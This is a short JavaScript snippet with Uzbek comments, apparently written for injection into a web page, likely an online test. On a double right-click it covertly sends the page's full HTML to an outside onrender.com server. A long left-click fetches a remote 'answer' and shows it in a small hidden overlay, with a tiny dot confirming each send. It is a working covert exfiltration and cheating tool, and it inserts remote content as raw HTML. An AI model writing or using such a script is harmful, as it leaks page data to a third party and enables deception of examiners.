(function(){
    const S = 'https://f1-f2mq.onrender.com';
    
    // 1. "Ulandi" yozuvi (1 sekundga chiqadi)
    let st = document.createElement('div');
    st.style = "position:fixed; top:5px; right:5px; background:green; color:white; padding:2px 8px; border-radius:3px; z-index:999999; font-size:11px; font-family:sans-serif; pointer-events:none;";
    st.innerHTML = "Ulandi";
    document.body.appendChild(st);
    setTimeout(() => st.remove(), 1000);

    // 2. Maxfiy indikator nuqta (Savol yuborilganda ko'rinadi)
    let ind = document.createElement('div');
    ind.style = "position:fixed; bottom:2px; right:2px; width:4px; height:4px; border-radius:50%; z-index:999999; pointer-events:none; display:none;";
    document.body.appendChild(ind);

    // 3. Javob qutichasi (Chap pastda)
    let box = document.createElement('div');
    box.style = "position:fixed; bottom:10px; left:10px; background:rgba(0,0,0,0.95); color:white; padding:12px; z-index:999999; display:none; border-radius:5px; font-family:sans-serif; font-size:13px; border:1px solid #333; max-width:220px; pointer-events:none;";
    document.body.appendChild(box);

    // 4. Savol yuborish: O'ng tugmani 2 marta tez bosish
    let lastRightClick = 0;
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        let now = Date.now();
        if (now - lastRightClick < 400) {
            fetch(S + '/upload-html', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ html: document.documentElement.outerHTML })
            });
            // Savol ketganini bildiruvchi mitti nuqta
            ind.style.background = '#555';
            ind.style.display = 'block';
            setTimeout(() => { ind.style.display = 'none'; }, 1000);
        }
        lastRightClick = now;
        box.style.display = 'none'; // O'ng tugma bosilganda javob o'chadi
    });

    // 5. Javobni chiqarish: Chap tugma 3 soniya
    let t;
    document.addEventListener('mousedown', (e) => {
        if (e.button === 0) {
            t = setTimeout(async () => {
                try {
                    const r = await fetch(S + '/latest');
                    const d = await r.json();
                    box.innerHTML = d.message;
                    box.style.display = 'block';
                } catch(e) {}
            }, 3000);
        }
    });
    document.addEventListener('mouseup', () => clearTimeout(t));
})();
